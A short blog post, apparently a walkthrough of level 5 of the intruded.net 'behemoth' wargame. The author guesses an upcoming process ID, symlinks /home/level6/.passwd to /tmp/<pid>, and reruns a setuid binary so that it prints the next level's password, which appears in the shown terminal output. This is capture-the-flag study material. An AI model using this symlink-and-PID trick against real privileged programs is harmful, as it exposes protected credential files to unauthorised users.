Title: intruded.net, behemoth: level 5
Date: 2011/10/01 21:24
Author: Ken Ko
Tags: intruded.net, LD_PRELOAD, behemoth
Category: tutorials

Kind of lame, this one. 

I tried to use the LD_PRELOAD method to have a repeatable getpid() call, but it would only appear to work under gdb and ltrace; very strange.

So, let's go with a more brute force approach:

[codebox 1]

Now, to use it:

<code>
level5@behemoth:/tmp$ ./zpid
2327
level5@behemoth:/tmp$ ./zpid
2328
level5@behemoth:/tmp$ ln -s /home/level6/.passwd /tmp/2331
level5@behemoth:/tmp$ /wargame/level5
PID not found!
level5@behemoth:/tmp$ /wargame/level5
Finished sleeping, fgetcing
I47l6DVn
level5@behemoth:/tmp$
</code>

Wasted a lot of time on that LD_PRELOAD. 
Oh well; should really figure out why that didn't work. 
